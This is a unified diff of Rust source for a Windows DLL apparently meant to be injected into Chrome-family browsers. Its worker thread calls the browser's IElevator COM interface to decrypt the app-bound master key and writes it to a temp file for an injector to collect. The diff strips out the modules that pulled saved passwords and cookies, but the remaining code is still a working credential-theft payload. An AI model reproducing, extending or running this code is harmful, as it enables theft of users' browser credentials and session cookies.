@@ -9,8 +9,6 @@
 #![allow(non_snake_case, unused)]
 
 mod elevator;
-mod crypto;
-mod database;
 
 use std::{ffi::c_void, path::PathBuf, thread, time::Duration};
 
@@ -25,6 +23,7 @@ use windows::{
 };
 
 const APPB: &[u8; 4] = b"APPB";
+const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
 
 // ── DllMain ───────────────────────────────────────────────────────────────────
 
@@ -42,15 +41,12 @@ pub unsafe extern "system" fn DllMain(
 }
 
 unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
-    debug_log("worker thread started");
-    // Let Chrome finish CoInitializeSecurity before we touch COM.
     thread::sleep(Duration::from_secs(4));
-    debug_log("worker delay complete, starting run()");
     let r = std::panic::catch_unwind(|| run());
-    match r {
-        Ok(Ok(())) => { debug_log("run() completed OK"); }
-        Ok(Err(e)) => { debug_log(&format!("run() error: {e}")); write_error(&e); }
-        Err(_)     => { debug_log("panic in payload"); write_error("panic in payload"); }
+    if let Ok(Err(e)) = r {
+        write_error(&e);
+    } else if r.is_err() {
+        write_error("panic in payload");
     }
     0
 }
@@ -58,17 +54,12 @@ unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
 // ── Main logic ────────────────────────────────────────────────────────────────
 
 fn run() -> Result<(), String> {
-    debug_log("run() started");
-
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
-    debug_log(&format!("exe: {exe}"));
 
     let browser = elevator::resolve_browser(&exe)
         .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
-
-    debug_log(&format!("detected browser: {}", browser.name));
 
     // Locate Local State for the detected browser.
     let local_appdata = std::env::var("LOCALAPPDATA")
@@ -106,69 +97,34 @@ fn run() -> Result<(), String> {
     }
     let encrypted_key = &encrypted_key[4..];
 
-    debug_log("calling IElevator::DecryptData");
     let master_key = elevator::decrypt_for_browser(browser, encrypted_key)
-        .map_err(|e| { let m = format!("IElevator: {e}"); debug_log(&m); m })?;
+        .map_err(|e| format!("IElevator: {e}"))?;
 
     if master_key.len() != 32 {
         return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
     }
 
-    // Profile directory.
-    let profile_dir = PathBuf::from(&local_appdata)
-        .join(browser.user_data_rel)
-        .join("Default");
-
-    // Extract passwords and cookies.
-    let passwords = database::extract_passwords(&profile_dir, &master_key)
-        .unwrap_or_else(|e| vec![serde_json::json!({"error": e})]);
-
-    let cookies = database::extract_cookies(&profile_dir, &master_key)
-        .unwrap_or_else(|e| vec![serde_json::json!({"error": e})]);
-
-    // Write JSON result to temp file for the injector to pick up.
     let result = serde_json::json!({
         "browser": browser.name,
         "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
-        "passwords": passwords,
-        "cookies": cookies,
     });
 
-    debug_log("writing result");
-    let json = serde_json::to_string_pretty(&result).unwrap();
-    let mut wrote = false;
-    for p in result_paths() {
-        if std::fs::write(&p, &json).is_ok() { wrote = true; }
-    }
-    if !wrote {
-        return Err("could not write result to any path".into());
-    }
+    let json = serde_json::to_string(&result).unwrap();
+    let path = result_path();
+    std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;
 
     Ok(())
 }
 
-const PUBLIC_RESULT: &str = r"C:\Users\Public\chrome_recovery_result.json";
-const PUBLIC_DEBUG:  &str = r"C:\Users\Public\cr_debug.log";
-
-fn debug_log(msg: &str) {
-    use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(PUBLIC_DEBUG) {
-        let _ = writeln!(f, "{msg}");
+fn result_path() -> PathBuf {
+    if let Ok(p) = std::env::var(RESULT_ENV) {
+        return PathBuf::from(p);
     }
-}
-
-fn result_paths() -> Vec<std::path::PathBuf> {
-    vec![
-        std::env::temp_dir().join("chrome_recovery_result.json"),
-        std::path::PathBuf::from(PUBLIC_RESULT),
-    ]
+    std::env::temp_dir().join("chrome_recovery_result.json")
 }
 
 fn write_error(msg: &str) {
     let r = serde_json::json!({ "error": msg });
-    let json = serde_json::to_string_pretty(&r).unwrap();
-    for p in result_paths() {
-        let _ = std::fs::write(&p, &json);
-    }
-    debug_log(&format!("write_error: {msg}"));
+    let json = serde_json::to_string(&r).unwrap();
+    let _ = std::fs::write(result_path(), json);
 }
